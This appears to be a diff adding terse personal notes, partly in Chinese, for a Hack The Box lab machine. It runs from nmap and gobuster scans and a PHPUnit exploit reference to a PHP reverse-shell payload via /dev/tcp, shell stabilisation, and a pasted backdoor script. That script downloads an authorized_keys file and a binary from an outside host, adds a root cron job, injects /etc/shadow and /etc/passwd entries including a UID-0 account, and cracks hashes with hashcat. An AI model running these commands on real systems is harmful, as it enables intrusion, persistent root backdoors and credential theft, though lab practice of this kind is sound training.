@@ -1,0 +1,40 @@
+nmap -sV -sC -Pn 10.10.11.146 > nmap.txt
+nmap -p- 10.10.11.146  > nmapall.txt
+網頁查看到有該域名，綁定 host http://store.djewelry.htb/
+使用gobuster 查找路徑 http://store.djewelry.htb/
+gobuster dir  -u http://store.djewelry.htb/ -w /Users/timmy/github/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php > gobuster.txt
+查找到有vendor路徑，在vendor路徑下發現有phpunit
+根據phpunit可以查找到相關exploit,https://www.exploit-db.com/exploits/50702
+10.10.16.13
+
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
+
+data=f'<?php system(\'{cmd}\') ?>')
+data=f'<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.13/443 0>&1'") ?>')
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM=xterm
+ctrl+z
+stty raw -echo && fg
+enter
+stty rows 54 && stty columns 235 && export TERM=xterm
+export TERM=xterm
+
+取得一般www-data用戶後，
+https://github.com/rebootuser/LinEnum.git
+
+
+wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; 
+wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; 
+echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; 
+awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd;
+while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt;
+rm users.txt;
+
+
+echo "$1"1:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::
+echo 'kali:$6$irbaKgZA08Nkvl/Z$IjChNZzrw1gt8D25jMGq7RoGV5uUxaVpc1ZxWGkGaqPZEi29iEb5iOLWg.dLQM.MkZUh9k9kFPlSjd6edBTTU1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+
+./hashcat  /Users/timmy/github/timmy/OSCP/hackthebox/Linux/Undetected/hash.txt /Users/timmy/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt  -O --force
